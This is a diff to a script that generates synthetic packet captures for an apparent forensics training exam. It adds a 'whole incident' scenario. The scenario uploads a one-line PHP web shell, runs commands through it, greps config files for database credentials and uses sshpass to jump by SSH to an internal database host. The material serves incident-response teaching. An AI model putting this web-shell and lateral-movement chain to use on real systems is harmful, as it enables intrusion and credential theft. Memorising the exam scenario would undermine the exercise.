@@ -8,7 +8,7 @@ values (flags are injected post-deploy by the platform).
 Usage:
     python scripts/make_capture_pcap.py <scenario> <out.pcap>
 
-Scenarios: wiretap | blackbox | fullreport
+Scenarios: wiretap | blackbox | fullreport | wholeincident
 Re-run and commit the output — deterministic (fixed timestamps/seq numbers).
 """
 from __future__ import annotations
@@ -139,6 +139,39 @@ SCENARIOS = {
                 b"\r\n\r\n"),
             (1, b"HTTP/1.1 200 OK\r\nContent-Length: 51\r\n\r\n"
                 b"<tar archive - /home and /etc bundled, 4.2M on wire>"),
+        ]),
+    ],
+    # for-t3-exam "whole incident": upload + enum + db jump — matches the
+    # access.log planted by pentrain_for_t3_exam_web line for line.
+    "wholeincident": [
+        (T0, 43000, 80, [
+            (0, b"POST /upload.php HTTP/1.1\r\nHost: shop.local\r\n"
+                b"Content-Type: multipart/form-data; boundary=x\r\n\r\n"
+                b"--x\r\nContent-Disposition: form-data; name=\"f\"; "
+                b"filename=\"shell.phtml\"\r\n\r\n"
+                b"<?php system($_GET['c']); ?>\r\n--x--\r\n"),
+            (1, b"HTTP/1.1 200 OK\r\nContent-Length: 24\r\n\r\n"
+                b"uploaded: shell.phtml ok\n"),
+        ]),
+        (T0 + 6, 43001, 80, [
+            (0, b"GET /uploads/shell.phtml?c=id HTTP/1.1\r\nHost: shop.local"
+                b"\r\n\r\n"),
+            (1, b"HTTP/1.1 200 OK\r\nContent-Length: 51\r\n\r\n"
+                b"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"),
+            (0, b"GET /uploads/shell.phtml?c=cat%20/etc/hosts HTTP/1.1"
+                b"\r\nHost: shop.local\r\n\r\n"),
+            (1, b"HTTP/1.1 200 OK\r\nContent-Length: 87\r\n\r\n"
+                b"127.0.0.1 localhost\n10.10.10.57 web02\n10.10.10.58 db02\n"),
+            (0, b"GET /uploads/shell.phtml?c=grep%20-ri%20db%20/etc%20/opt"
+                b" HTTP/1.1\r\nHost: shop.local\r\n\r\n"),
+            (1, b"HTTP/1.1 200 OK\r\nContent-Length: 212\r\n\r\n"
+                b"/opt/shop/db.ini:user = dbmaint\n"
+                b"/opt/shop/db.ini:pass = DbMaint2024!\n"
+                b"/opt/shop/db.ini:host = db02\n"),
+            (0, b"GET /uploads/shell.phtml?c=sshpass%20-p%20DbMaint2024!%20"
+                b"ssh%20dbmaint@db02 HTTP/1.1\r\nHost: shop.local\r\n\r\n"),
+            (1, b"HTTP/1.1 200 OK\r\nContent-Length: 33\r\n\r\n"
+                b"<interactive shell opened - off-wire>\n"),
         ]),
     ],
 }
